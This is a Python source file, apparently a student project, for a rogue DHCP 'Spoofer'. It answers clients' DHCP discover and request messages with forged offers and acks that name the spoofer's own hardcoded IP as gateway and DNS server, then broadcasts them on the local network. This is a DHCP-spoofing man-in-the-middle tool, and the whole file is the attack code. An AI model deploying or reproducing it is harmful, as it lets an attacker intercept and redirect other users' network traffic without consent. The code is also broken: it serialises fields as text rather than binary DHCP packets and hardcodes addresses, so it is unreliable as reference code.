import socket as s
import netifaces as netif
import ipaddress as ip
from typing import Dict
from collections.abc import Mapping 
import time #tempor�rio

class Spoofer:

#    def __init__(self, dhcp_offer_header : Dict):
#        self.dhcp_offer_header = dhcp_offer_header

    @staticmethod
    def getIP(inBytes = False):
#        hostname = s.gethostname()
#        ipaddr = s.gethostbyname(hostname)
#
#        if inBytes:
#            return s.inet_aton(ipaddr)
#    
#       return str(ipaddr)
        return '10.32.143.134'

    @staticmethod    
    def getNetmask(inBytes = False): # https://stackoverflow.com/a/54074160
#        for iface in netif.interfaces():
#    #       time.sleep(1) # tempor�rio, se n�o tiver sleep e fizer dhclient -r na mesma m�quina que roda o programa, o IP n�o � configurado a tempo e n�o da pra pegar a m�scara
#            addresses = netif.ifaddresses(iface)
#
#            if 2 in addresses.keys():
#                if iface.startswith('wlp') or iface.startswith('enp'):
#                    mask = addresses[2][0]['netmask']
#
#        if inBytes:
#            return s.inet_aton(mask)
#
#        return str(mask)
        return '255.255.255.0'
    
    @staticmethod
    def write_offer(dhcp_discover_header : Dict):
        dhcp_offer_header = {}
        dhcp_offer_header['op']     =   2
        dhcp_offer_header['hwtype'] =   1
        dhcp_offer_header['hlen']   =   6
        dhcp_offer_header['hops']   =   0
        dhcp_offer_header['xid']    =   dhcp_discover_header['xid']
        dhcp_offer_header['secs']   =   0
        dhcp_offer_header['flags']  =   0
        dhcp_offer_header['ciaddr'] =   "0.0.0.0"
        dhcp_offer_header['yiaddr'] =   "10.132.249.253" #s.inet_aton('10.132.249.253')
        dhcp_offer_header['siaddr'] =   Spoofer.getIP()
        dhcp_offer_header['giaddr'] =   Spoofer.getIP()
        dhcp_offer_header['chaddr'] =   dhcp_discover_header['chaddr']
        dhcp_offer_header['sname']  =   dhcp_discover_header['sname']
        dhcp_offer_header['bootf']  =   dhcp_discover_header['bootf']
        dhcp_offer_header[1]        =   {'length': 4, 'res': Spoofer.getNetmask()}  
        dhcp_offer_header[3]        =   {'length': 4, 'res': Spoofer.getIP()}       
        dhcp_offer_header[6]        =   {'length': 4, 'res': Spoofer.getIP()}       
        dhcp_offer_header[51]       =   {'length': 4, 'res': 3600}                      
        dhcp_offer_header[53]       =   {'length': 1, 'res': 0x2}                         
        dhcp_offer_header[54]       =   {'length': 4, 'res': Spoofer.getIP()}       
        dhcp_offer_header[58]       =   {'length': 4, 'res': 1800}                      
        dhcp_offer_header[59]       =   {'length': 4, 'res': 3150}                       
        dhcp_offer_header[0]        =   {'length': 4, 'res': 0x00000}           
        dhcp_offer_header[255]      =   {'length': 4, 'res': 0xFF}

        return dhcp_offer_header

    def write_ack(dhcp_request_header : Dict):
        dhcp_ack_header = {}
        dhcp_ack_header['op']     =   2
        dhcp_ack_header['hwtype'] =   1
        dhcp_ack_header['hlen']   =   6
        dhcp_ack_header['hops']   =   0
        dhcp_ack_header['xid']    =   dhcp_request_header['xid']
        dhcp_ack_header['secs']   =   0
        dhcp_ack_header['flags']  =   0
        dhcp_ack_header['ciaddr'] =   "0.0.0.0"
        dhcp_ack_header['yiaddr'] =   "10.132.249.253" #s.inet_aton('10.132.249.253')
        dhcp_ack_header['siaddr'] =   Spoofer.getIP()
        dhcp_ack_header['giaddr'] =   Spoofer.getIP()
        dhcp_ack_header['chaddr'] =   dhcp_request_header['chaddr']
        dhcp_ack_header['sname']  =   dhcp_request_header['sname']
        dhcp_ack_header['bootf']  =   dhcp_request_header['bootf']
        dhcp_ack_header[1]        =   {'length': 4, 'res': Spoofer.getNetmask()}  
        dhcp_ack_header[3]        =   {'length': 4, 'res': Spoofer.getIP()}       
        dhcp_ack_header[6]        =   {'length': 4, 'res': Spoofer.getIP()}       
        dhcp_ack_header[51]       =   {'length': 4, 'res': 3600}                      
        dhcp_ack_header[53]       =   {'length': 1, 'res': 0x5}                         
        dhcp_ack_header[54]       =   {'length': 4, 'res': Spoofer.getIP()}       
        dhcp_ack_header[58]       =   {'length': 4, 'res': 1800}                      
        dhcp_ack_header[59]       =   {'length': 4, 'res': 3150}                       
        dhcp_ack_header[0]        =   {'length': 4, 'res': 0x00000}           
        dhcp_ack_header[255]      =   {'length': 4, 'res': 0xFF}

        return dhcp_ack_header


    def opt_to_byte(dict):
        res = ""
        for k, v in dict.items():
            res += f"{k}{len(f'{v}')}{v}"
        return res


    def dict_to_byte(dict):
        byt = b''
        for i in dict.values():
            if isinstance(i, Mapping):
                i = Spoofer.opt_to_byte(i)

            byt += f"{i}".encode(encoding = 'UTF-8')
        return byt


    @staticmethod
    def spoof(dhcp_header : Dict):
        if dhcp_header[53]['res'] == 1:
            response_header = Spoofer.write_offer(dhcp_header)
        elif dhcp_header[53]['res'] == 3:
            response_header = Spoofer.write_ack(dhcp_header)
        broadcast = str(ip.IPv4Network(Spoofer.getIP() + '/' + Spoofer.getNetmask(), False).broadcast_address)

        print(broadcast)

        data = Spoofer.dict_to_byte(response_header)

        dport = 68
        udp = s.socket(s.AF_INET, s.SOCK_DGRAM)
        udp.setsockopt(s.SOL_SOCKET, s.SO_BROADCAST, 1)
        dest = (broadcast, dport)
        udp.sendto(data, dest)
        udp.close()